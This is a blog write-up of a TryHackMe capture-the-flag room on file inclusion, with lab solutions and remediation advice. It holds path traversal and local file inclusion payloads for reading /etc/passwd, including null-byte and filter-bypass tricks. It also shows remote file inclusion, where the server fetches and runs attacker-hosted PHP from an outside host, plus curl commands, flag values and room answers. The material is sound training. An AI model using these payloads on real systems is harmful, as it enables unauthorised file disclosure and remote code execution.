---
title:  "THM: File Inclusion"
date:   2024-02-20 18:00:00 +0000
categories: [WebHacking]
tags: [WebHacking]
---

![image](/assets/img/fileInclusion.png)

---
Ref: 

- [THM File Inclusion:](https://tryhackme.com/room/fileinc)

- [FFUF tool and wordlist - Github](https://github.com/ffuf/ffuf)

- [Crack Station Database](https://crackstation.net/)

- [Decode from Base64 format](https://www.base64decode.org/)

- [Link](https://www.youtube.com/watch?v=Qt6L6q17TZ4)

---
Task 1  Introduction
---
### What is File inclusion?

This room aims to equip you with the essential knowledge to exploit file inclusion vulnerabilities, including ```Local File Inclusion (LFI)```, ```Remote File Inclusion (RFI)```, and ```directory traversal```. Also, we will discuss the risk of these vulnerabilities if they're found and the required remediation. We provide some practical examples of each vulnerability as well as hands-on challenges.

In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are ```query parameter strings attached to the URL``` that could be used to retrieve data or perform actions based on user input. The following diagram breaks down the essential parts of a URL.

![image](/assets/img/fileInclusion01.png)

For example, 

parameters are used with Google searching, where GET requests pass user input into the search engine. https://www.google.com/search?q=TryHackMe. If you are not familiar with the topic, you can view the How The Web Works module to understand the concept.  
Let's discuss a scenario where a user requests to access files from a webserver. First, the user sends an HTTP request to the webserver that includes a file to display. 

For example, 

if a user wants to access and display their CV within the web application, the request may look as follows, http://webapp.thm/get.php?file=userCV.pdf, where the file is the parameter and the userCV.pdf, is the required file to access.

![image](/assets/img/fileInclusion02.png)

Task 2  Deploy the VM
---
Deploy the attached VM to follow and apply the technique as well as do the challenges. In order to access this VM, please make sure to connect to the TryHackMe network via OpenVPN or access it directly from the Attackbox.

Please visit the link http://10.10.156.111/ which should look as follows,

Task 3  Path Traversal
---
#### Path Traversal

Also known as ```Directory traversal```, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

Path traversal vulnerabilities occur when the user's input is passed to a function such as ```file_get_contents``` in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file. You can find more information about the function [here](https://www.php.net/manual/en/function.file-get-contents.php).

The following graph shows how a web application stores files in ```/var/www/app```. The happy path would be the user requesting the contents of userCV.pdf from a defined path ```/var/www/app/CVs```.

![img](/assets/img/fileInclusion03.png)


We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the ```dot-dot-slash``` attack, take advantage of moving the directory one step up using the double dots ```../```. If the attacker finds the entry point, which in this case ```get.php?file=```, then the attacker may send something as follows, http://webapp.thm/get.php?```file=../../../../etc/passwd```


Suppose there isn't input validation, and instead of accessing the PDF files at ```/var/www/app/CVs``` location, the web application retrieves files from other directories, which in this case ```/etc/passwd```. Each ```.. ```entry moves one directory until it reaches the root directory /. Then it changes the directory to ```/etc```, and from there, it read the ```passwd``` file.

![img](/assets/img/fileInclusion04.png)

As a result, the web application sends back the file's content to the user.

![img](/assets/img/fileInclusion05.png)

Similarly, if the web application runs on a ```Windows server```, the attacker needs to provide Windows paths. For example, if the attacker wants to read the ```boot.ini``` file located in ```c:\boot.ini```, then the attacker can try the following depending on the target OS version:

http://webapp.thm/get.php?```file=../../../../boot.ini``` or

http://webapp.thm/get.php?```file=../../../../windows/win.ini```

The same concept applies here as with Linux operating systems, where we climb up directories until it reaches the root directory, which is usually c:\.

Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing. 

![img](/assets/img/fileInclusion06.png)

---

What function causes path traversal vulnerabilities in PHP?
=> file_get_contents

---

Task 4  Local File Inclusion - LFI
---
### Local File Inclusion (LFI)

LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as ```include```, ```require```, ```include_once```, and ```require_once``` often contribute to vulnerable web applications. In this room, we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.


---

In this section, we will walk you through various ```LFI``` scenarios and how to exploit them.

1. Suppose the web application provides two languages, and the user can select between the EN and AR
```
<?PHP 
	include($_GET["lang"]);
?>
```
The PHP code above uses a ```GET``` request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: ```http://webapp.thm/index.php?lang=EN.php``` to load the ```English``` page or ```http://webapp.thm/index.php?lang=AR.php``` to load the ```Arabic``` page, where EN.php and AR.php files exist in the same directory.

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the ```/etc/passwd``` file, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?```file=/etc/passwd```

In this case, it works because there isn't a directory specified in the include function and no input validation.

Now apply what we discussed and try to read /etc/passwd file. Also, answer question #1 below.



2. Next, In the following code, the developer decided to specify the directory inside the function.
```
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```
In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:

http://webapp.thm/index.php?```lang=../../../../etc/passwd```

Now apply what we discussed, try to read files within the server, and figure out the directory specified in the include function and answer question #2 below.

Answer the questions below

---

Give Lab #1 a try to read /etc/passwd. What would the request URI be?
Answer format: /****.*********/***/******
```
/lab1.php?file=/etc/passwd
```

In Lab #2, what is the directory specified in the include function?

Answer: includes
![img](/assets/img/fileInclusion07.png)



Task 5  Local File Inclusion - LFI #2
---

In this task, we go a little bit deeper into LFI. We discussed a couple of techniques to bypass the filter within the ```include``` function.

1. In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.

In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input, such as THM, we get the following error
```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like:  ```include(languages/THM.php);```. 

If you look at the directory closely, we can tell the function includes files in the languages directory is adding  .php at the end of the entry. Thus the valid input will be something as follows:  index.php?lang=EN, where the file EN is located inside the given ```languages directory``` and named  ```EN.php```. 

Also, the error message disclosed another important piece of information about the full web application directory path which is ```/var/www/html/THM-4/```

To exploit this, we need to use the ```../``` trick, as described in the directory traversal section, to get out the current folder. Let's try the following:

http://webapp.thm/index.php?```lang=../../../../etc/passwd```

Note that we used ```4``` ```../``` because we know the path has four levels ```/var/www/html/THM-4```. But we still receive the following error:
```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is ```%00```.

Using null bytes is an injection technique where URL-encoded representation such as ```%00``` or ```0x00``` in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

By adding the ```Null Byte``` at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:

include("```languages/../../../../../etc/passwd%00```").".php"); which equivalent to → include(```"languages/../../../../../etc/passwd"```);

NOTE: the ```%00``` trick is fixed and not working with PHP 5.3.4 and above.

Now apply what we showed in ```Lab #3```, and try to read files /etc/passwd, answer question #1 below.



2. In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the ```NullByte``` ```%00``` or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?```lang=/etc/passwd/```. We could also use http://webapp.thm/index.php?```lang=/etc/passwd%00```.

To make it clearer, if we try this concept in the file system using cd .., it will get you back one step; however, if you do cd ., It stays in the current directory.  Similarly, if we try  ```/etc/passwd/..```, it results to be  ```/etc/``` and that's because we moved one to the root.  Now if we try  ```/etc/passwd/.```, the result will be  ```/etc/passwd``` since ```dot``` refers to the ```current directory```.

Now apply this technique in Lab #4 and figure out to read /etc/passwd.



3. Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!

http://webapp.thm/index.php?```lang=../../../../etc/passwd```

We got the following error!
```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```

If we check the warning message in the ```include(languages/etc/passwd)``` section, we know that the web application replaces the ```../``` with the ```empty string```. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: ```....//....//....//....//....//etc/passwd```

Why did this work?

This works because the PHP filter only matches and replaces the ```first subset string ../``` it finds and doesn't do another pass, leaving what is pictured below.

![img](/assets/img/fileInclusion08.png)

Try out Lab #5 and try to read /etc/passwd and bypass the filter!



4. Finally, we'll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?```lang=languages/EN.php``` then, to exploit this, we need to include the directory in the payload like so: ```?lang=languages/../../../../../etc/passwd```.

Try this out in Lab #6 and figure what the directory that has to be present in the input field is.

---

Give Lab #3 a try to read /etc/passwd. What is the request look like?
/lab3.php?file=../../../../etc/passwd%00
![img](/assets/img/fileInclusion09.png)


Which function is causing the directory traversal in Lab #4?
Answer : file_get_contents
![img](/assets/img/fileInclusion10.png)

Try out Lab #6 and check what is the directory that has to be in the input field?
Answer : THM-profile
![img](/assets/img/fileInclusion11.png)

Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value?
Answer: 12.04
![img](/assets/img/fileInclusion12.png)


Task 6  Remote File Inclusion - RFI
---
### Remote File Inclusion - RFI

Remote File Inclusion (RFI) is a technique to ```include remote files``` and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the ```allow_url_fopen``` option needs to be ```on```.



The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)


An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the ```malicious file``` is injected into the ```include``` function via ```HTTP requests```, and the content of the malicious file executes on the vulnerable application server.

---

### RFI steps

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server ```http://attacker.thm/cmd.txt``` where cmd.txt contains a printing message  Hello THM.
```
<?PHP echo "Hello THM"; ?>
```

First, the attacker ```injects the malicious URL```, which points to the attacker's server, such as 
```
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. 
```
If there is no input validation, then the malicious URL passes into the include function. 

Next, the web app server will send a GET request to the malicious server to fetch the file. 

As a result, the web app includes the remote file into ```include``` function to ```execute the PHP file``` within the page and ```send the execution content``` to the attacker. 

In our case, the current page somewhere has to show the Hello THM message.

Visit the following lab URL: http://10.10.136.249/playground.php to try out an RFI attack.


### Exercise

---

32:00

---

Step 1 
- Enter this to the end of the URL "?

?file=http://domain.com/shell.php"
```
http://10.10.136.249/playground.php?file=http://domain.com/shell.php
```

Step 2 
- Open a terminal
- start a web server
```
sudo python3 -m http.server
```
Step 3 
- click on "Sublime text" icon
- create a php file
- Save the php file at root directory as cmd.txt

```
<?php print exec_('hostname'); ?>
```
step 4
- open a terminal and get the ip of the web server (Attack side)
- type the url as
```
http://10.10.136.249/playground.php?file=http://10.10.15.247:8000/cmd.txt
```








Task 7  Remediation
---
As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:


1. Keep system and services, including web application frameworks, updated with the latest version.

2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.

3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.

4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as ```allow_url_fopen on``` and ```allow_url_include```.

5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.

6. Never trust user input, and make sure to implement proper input validation against file inclusion.

7. Implement whitelisting for file names and locations as well as blacklisting.






Task 8  Challenge
---
Great Job! Now apply the techniques you've learned to capture the flags! Familiarizing yourself with [HTTP Web basics](https://tryhackme.com/room/httpindetail) could help you complete these challenges.

Make sure the attached VM is up and running then visit: http://10.10.136.249/challenges/index.php

### Steps for testing for LFI

1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!

2. Enter a valid input to see how the web server behaves.

3. Enter invalid inputs, including special characters and common file names.

4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.

5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.

6. Understand the input validation and if there are any filters!

7. Try the inject a valid entry to read sensitive files




---

Capture Flag1 at /etc/flag1

Answer : *****************

Step 1
- open the url
```
http://10.10.136.249/challenges/chall1.php
```
- user browser "Imspector" to view the html code on the "form" 
- locate Method and change from GET to POST via Burpsuite
or 
- open a command line and type
```
curl -X POST http://10.10.251.238/challenges/chall1.php -d 'method=GET&file=/etc/flag1'
```
- -X Request command
- -d for data

Note: 
- The first method "POST" tells how we want to send the request to the server

- The second method "GET" tells the server how to handle our request

Output
```

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Lab #Challenge-1</title>


    <!-- Bootstrap core CSS -->
    <link href="./css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Stylesheet -->
    <link href="./css/style.css" rel="stylesheet">

    <!-- Core libraries bootstrap & jquery -->
    <script src="./js/bootstrap5.min.js"></script>
    <script src="./js/jquery-3.6.0.min.js"></script>

    <!-- Custom JS code -->
    <script src="./js/script.js"></script>

  </head>

    <header>
<div class="container">
  <ul class="nav">
  	<li class="nav-item">
    		<a class="nav-link" href="./index.php">Home</a>
	</li>
        <li class="nav-item">
                <a class="nav-link">/</a>
        </li>
 	<li class="nav-item">
	<a class="nav-link active" >Lab #Challenge-1</a>
        </li>
  </ul>
</div>
    </header>
<body>
  <div class="container" style="padding-top: 5%;">
      <h1 class="display-4">File Inclusion Lab</h1>
      <p class="lead">Lab #Challenge-1: Include a file in the input form below
<hr class="my-4">
<div class="alert alert-warning" role="alert">
  The input form is broken! You need to send `POST` request with `file` parameter!
  </div>
  <form action= "#" method="GET">
          <div class="input-group mb-3">
            <div class="input-group-prepend">
              <span class="input-group-text">File Name</span>
            </div>
            <input name='file' type="text" class="form-control" placeholder="For example: welcome.php" aria-label="For example: welcome.php" aria-describedby="basic-addon2">
            <div class="input-group-append">
              <button class="btn btn-success" type="submit" >Include</button>
            </div>
          </div>
        </form>

        <div class='mt-5 mb-5'>
          <h5>Current Path</h5>
          <div class='file-Location'><code>/var/www/html</code></div>
        </div>
        <div>
          <h5>File Content Preview of <b>/etc/flag1</b></h5>
	  <code>F1x3d-iNpu7-f0rrn
</code>
    </div>  </body>
</html>

```








---

Capture Flag2 at /etc/flag2

Answer : ****************

Step 1 
- open the url and select challenges 2
```
http://10.10.251.238/challenges/index.php
```
- open Burpsuite 
- open FoxyProxy extension
![img](/assets/img/fileInclusion14.png)








--- 
Capture Flag3 at /etc/flag3

Answer : ****************


```
root@ip-10-10-204-185:~# 

curl -X POST 10.10.197.165/challenges/chall3.php -d 'method=POST&file=....//....//....//....//etc/flag3%00' --output -
```
```
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Lab #Challenge 3</title>


    <!-- Bootstrap core CSS -->
    <link href="./css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Stylesheet -->
    <link href="./css/style.css" rel="stylesheet">

    <!-- Core libraries bootstrap & jquery -->
    <script src="./js/bootstrap5.min.js"></script>
    <script src="./js/jquery-3.6.0.min.js"></script>

    <!-- Custom JS code -->
    <script src="./js/script.js"></script>

  </head>

    <header>
<div class="container">
  <ul class="nav">
  	<li class="nav-item">
    		<a class="nav-link" href="./index.php">Home</a>
	</li>
        <li class="nav-item">
                <a class="nav-link">/</a>
        </li>
 	<li class="nav-item">
	<a class="nav-link active" >Lab #Challenge 3</a>
        </li>
  </ul>
</div>
    </header>
<body>
  <div class="container" style="padding-top: 5%;">
      <h1 class="display-4">File Inclusion Lab</h1>
      <p class="lead">Lab #Challenge 3: Include a file in the input form below
<hr class="my-4">
	<form action= ".//chall3.php" method="GET">
          <div class="input-group mb-3">
            <div class="input-group-prepend">
              <span class="input-group-text">File Name</span>
            </div>
            <input name='file' type="text" class="form-control" placeholder="For example: welcome" aria-label="For example: welcome" aria-describedby="basic-addon2">
            <div class="input-group-append">
              <button class="btn btn-success" type="submit" >Include</button>
            </div>
          </div>    
        </form>
	
        <div class='mt-5 mb-5'>
          <h5>Current Path</h5>
          <div class='file-Location'><code>/var/www/html</code></div>
        </div>
        <div>
          <h5>File Content Preview of <b>....//....//....//....//etc/flag3</b></h5>
	  <code><br />
<b>Warning</b>:  include(....//....//....//....//etc/flag3) [<a href='function.include'>function.include</a>]: failed to open stream: No such file or directory in <b>/var/www/html/chall3.php</b> on line <b>49</b><br />
<br />
<b>Warning</b>:  include() [<a href='function.include'>function.include</a>]: Failed opening '....//....//....//....//etc/flag3' for inclusion (include_path='.:/usr/lib/php5.2/lib/php') in <b>/var/www/html/chall3.php</b> on line <b>49</b><br />
</code>
    </div>  </body>
</html>
```
```
curl -X POST 10.10.197.165/challenges/chall3.php -d 'method=POST&file=../../../../etc/flag3%00' --output -
```
```
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Lab #Challenge 3</title>


    <!-- Bootstrap core CSS -->
    <link href="./css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Stylesheet -->
    <link href="./css/style.css" rel="stylesheet">

    <!-- Core libraries bootstrap & jquery -->
    <script src="./js/bootstrap5.min.js"></script>
    <script src="./js/jquery-3.6.0.min.js"></script>

    <!-- Custom JS code -->
    <script src="./js/script.js"></script>

  </head>

    <header>
<div class="container">
  <ul class="nav">
  	<li class="nav-item">
    		<a class="nav-link" href="./index.php">Home</a>
	</li>
        <li class="nav-item">
                <a class="nav-link">/</a>
        </li>
 	<li class="nav-item">
	<a class="nav-link active" >Lab #Challenge 3</a>
        </li>
  </ul>
</div>
    </header>
<body>
  <div class="container" style="padding-top: 5%;">
      <h1 class="display-4">File Inclusion Lab</h1>
      <p class="lead">Lab #Challenge 3: Include a file in the input form below
<hr class="my-4">
	<form action= ".//chall3.php" method="GET">
          <div class="input-group mb-3">
            <div class="input-group-prepend">
              <span class="input-group-text">File Name</span>
            </div>
            <input name='file' type="text" class="form-control" placeholder="For example: welcome" aria-label="For example: welcome" aria-describedby="basic-addon2">
            <div class="input-group-append">
              <button class="btn btn-success" type="submit" >Include</button>
            </div>
          </div>    
        </form>
	
        <div class='mt-5 mb-5'>
          <h5>Current Path</h5>
          <div class='file-Location'><code>/var/www/html</code></div>
        </div>
        <div>
          <h5>File Content Preview of <b>../../../../etc/flag3</b></h5>
	  <code>P0st_1s_w0rk1in9
</code>
    </div>  </body>
</html>

```




---

Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?

Answer : lfi-vm-thm-f8c5b1a78692


- click on "Sublime text" icon
- create a php file
- Save the php file at root directory as cmd.txt

```
<?php print exec_('hostname'); ?>

http://10.10.197.165/playground.php?file=http://domain.com/shell.php

sudo python3 -m http.server

http://10.10.197.165/playground.php?file=http://10.10.204.185:8000/cmd.txt
